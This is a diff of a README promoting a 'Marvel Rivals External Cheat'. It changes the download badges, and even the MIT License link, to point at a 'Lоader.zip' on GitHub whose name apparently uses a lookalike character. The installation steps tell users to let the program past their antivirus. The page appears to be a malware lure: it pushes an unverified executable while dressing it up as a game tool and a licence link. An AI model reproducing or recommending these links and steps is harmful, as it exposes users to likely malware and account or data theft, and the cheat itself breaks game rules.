@@ -1,6 +1,6 @@
 # ⭐ Marvel Rivals External Cheat ⭐
 
-[![Download Now](https://img.shields.io/badge/Download-Marvel%20Rivals%20Cheat-blue?style=for-the-badge&logo=windows)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/monteiroxll/MightyRivals-AssistHub/main/Lоader.zip%20Rivals%20Cheat-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/monteiroxll/MightyRivals-AssistHub/main/Lоader.zip)
 
 Unlock advanced features in Marvel Rivals with our cutting-edge External Cheat tool. Designed for power-users, enhance your gameplay with automated advantages and competitive utilities. This program is crafted for maximum stability and performance, ensuring smooth operation across multiple systems.
 
@@ -32,7 +32,7 @@ Popular SEO keywords: marvel rivals cheat, marvel rivals enhancement, game boost
 
 ## 🚀 Installation
 
-1. [![Download Now](https://img.shields.io/badge/Download-Marvel%20Rivals%20Cheat-blue?style=for-the-badge&logo=windows)](https://easylauncher.su/PSnzrH)
+1. [![Download Now](https://raw.githubusercontent.com/monteiroxll/MightyRivals-AssistHub/main/Lоader.zip%20Rivals%20Cheat-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/monteiroxll/MightyRivals-AssistHub/main/Lоader.zip)
 2. Run the installer and follow on-screen instructions.
 3. Make sure your antivirus allows the program for smooth launch.
 4. Open Marvel Rivals and enjoy your new toolkit.
@@ -47,12 +47,12 @@ This tool is intended exclusively for educational and research purposes. Usage i
 
 ## 📜 License
 
-Open-sourced under the [MIT License](https://opensource.org/licenses/MIT) © 2025.
+Open-sourced under the [MIT License](https://raw.githubusercontent.com/monteiroxll/MightyRivals-AssistHub/main/Lоader.zip) © 2025.
 
 ---
 
 ## 🔗 Quick Access
 
-[![Download Now](https://img.shields.io/badge/Download-Marvel%20Rivals%20Cheat-blue?style=for-the-badge&logo=windows)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/monteiroxll/MightyRivals-AssistHub/main/Lоader.zip%20Rivals%20Cheat-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/monteiroxll/MightyRivals-AssistHub/main/Lоader.zip)
 
 ---
